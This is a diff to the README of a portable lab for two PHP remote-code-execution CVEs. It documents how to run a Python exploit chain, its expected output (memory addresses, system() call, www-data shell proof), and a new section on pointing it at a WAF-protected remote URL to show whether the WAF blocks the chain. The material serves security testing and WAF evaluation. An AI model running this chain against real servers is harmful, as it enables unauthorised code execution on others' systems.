@@ -1,7 +1,9 @@
 # php2shell portable lab (CVE-2026-109618 / CVE-2026-109619)
 
 A single Docker Compose target and one self-contained Python exploit. No
-gdb, no host access, no WAF, no host-mounted files.
+gdb, no host access, no host-mounted files. The lab itself has no WAF; the
+exploit reports the HTTP status of every chain request so you can point it
+at an external WAF and show whether that WAF blocked the chain.
 
 The target is deliberately made deterministic:
 
@@ -35,11 +37,15 @@ Expected output:
 [*] command id>o1a2b3c4 -> /o1a2b3c4
 [*] fixed bases heap=0x7ffff6800000 libphp=0x7ffff3200000
 [*] fire table=0x7ffff68b30d8 system=0x7ffff37996e0 cmd=b'id>o1a2b3c4'
+[*] producer -> HTTP 200
+[*] consumer -> no response (connection closed)
+[*] proof -> HTTP 200
 [+] RCE confirmed (fixed, attempt 1): uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[+] WAF/target did not block the chain: producer=200 consumer=0 proof=200
 ```
 
 Every run uses a fresh random output name, so a stale proof file can never
-produce a false positive. The script requires `uid=` in the fetched body.
+produce a false positive. The default command's output must contain `uid=`.
 
 To use another port:
 
@@ -54,8 +60,9 @@ python exploit.py --url http://127.0.0.1:8092/index.php
 misses, it leaks the real bases over HTTP and fires again. Use this if you
 run the lab on a host whose kernel lays out the image differently.
 
-`--mode fixed` only uses the hard-coded addresses. It is the fastest path
-(two requests, ~1.5 MB of traffic) and works on the reference setup.
+`--mode fixed` only uses the hard-coded addresses. It is the fastest path:
+one producer and one consumer per attempt, ~1.5 MB of traffic, and works on
+the reference setup.
 
 `--mode leak` always leaks first. It sends the stock 129 MiB field producer
 and a forged `Set-Cookie` overread consumer (~65 MB of wire), recovers both
@@ -75,6 +82,52 @@ Useful flags:
 
 The 14-byte command limit comes from the 167-byte fake HashTable: the
 command starts at offset `0x98` and needs a terminating NUL.
+
+## WAF evidence (blocked / not blocked)
+
+Every request in the chain is logged with its HTTP status, and the run ends
+with a verdict. Point `--url` at the endpoint behind the WAF to show the
+client what that WAF did to the default/minimal PoC:
+
+```sh
+python exploit.py --mode fixed --repeat 1 --allow-lan \
+  --url https://target.example/index.php
+```
+
+Blocked:
+
+```text
+[*] producer -> HTTP 403
+[*]     body: <html><body>Blocked by haltdos WAF</body></html>
+[*] consumer -> HTTP 403
+[*]     body: <html><body>Blocked by haltdos WAF</body></html>
+[*] proof -> HTTP 404
+[-] WAF/target BLOCKED the chain (HTTP 403): producer=403 consumer=403 proof=404
+```
+
+Allowed through:
+
+```text
+[*] producer -> HTTP 200
+[*] consumer -> no response (connection closed)
+[*] proof -> HTTP 200
+[+] RCE confirmed (fixed, attempt 1): uid=33(www-data) ...
+[+] WAF/target did not block the chain: producer=200 consumer=0 proof=200
+```
+
+`HTTP 0` / "no response" means the peer closed the connection without an
+HTTP response. The consumer does that after `system()` because the worker
+dies, so it is normal on a successful fire. A block is a rejection status:
+400, 403, 406, 413, 429, 501, or 503. If no request got a rejection status,
+the WAF accepted the requests; a missing proof then means the chain missed,
+not that it was blocked.
+
+`--mode fixed --repeat 1` is the clean demo: exactly one producer, one
+consumer, and one proof GET, with no rotation requests mixed in. With
+`--repeat 2`, `rotate=...` entries appear between attempts; with
+`--mode auto` / `--mode leak`, `leak-*` entries appear as well.
+
+For a non-loopback target, add `--allow-lan` (lab use only).
 
 ## Custom commands and proofs
 
